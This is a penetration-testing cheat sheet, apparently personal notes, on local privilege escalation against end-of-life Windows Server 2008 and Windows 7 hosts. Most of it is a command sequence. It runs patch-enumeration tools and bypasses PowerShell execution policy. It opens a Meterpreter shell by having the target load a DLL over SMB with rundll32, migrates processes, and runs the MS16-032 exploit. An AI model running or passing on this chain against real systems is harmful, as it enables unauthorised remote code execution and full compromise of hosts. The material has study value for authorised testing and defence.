# End of Life Systems

### Legacy Operating Systems

{% embed url="https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/" %}

### Windows Server

For an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. We can also use something like [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), which takes the results of thesysteminfocommand as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target

```shellscript
# Checking current patch level
wmic qfe

# Running sherlock script to look for missing patches
https://github.com/rasta-mouse/Sherlock
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns

# If we have results, we should try to get a meterpreter shell back and attempt LPE with 
# one of the identified CVE

# Obtaining a meterpreter shell
search smb_delivery

# Run the given command on the target
rundll32.exe \\<IP>\lEUZam\test.dll,0

# Press enter whe the meterpreter session opened then follow below
sessions
sessions -i <ID>

# We should have gotten a shell. Now look for the CVE exploit 
search 2010-3338

# Migrate to a x64 process for the exploit to work
getpid
ps
migrate <PID>

# Use the CVE payload
```

### Windows Desktop Versions

Here we will use an example against Windows 7

We can use Sherlock like above or in this case, see with a different tool, windows exploit suggester

{% embed url="https://github.com/strozfriedberg/Windows-Exploit-Suggester" %}

```shellscript
# Install python dependencies to run Windows exploit suggester
sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz
cd setuptools-2.0/
sudo python2.7 setup.py install

sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz
cd xlrd-1.0.0/
sudo python2.7 setup.py install

# Update the DB
sudo python2.7 windows-exploit-suggester.py --update

# Run the following command on the windows target and save the output to a file 
systeminfo

# Pass the file to the script 
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 

# Exploit MS16-032
https://www.exploit-db.com/exploits/39719
Set-ExecutionPolicy bypass -scope process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

If we have a meterpreter shell on the session, we can use the `post/multi.recon.local_exploit_suggester` module
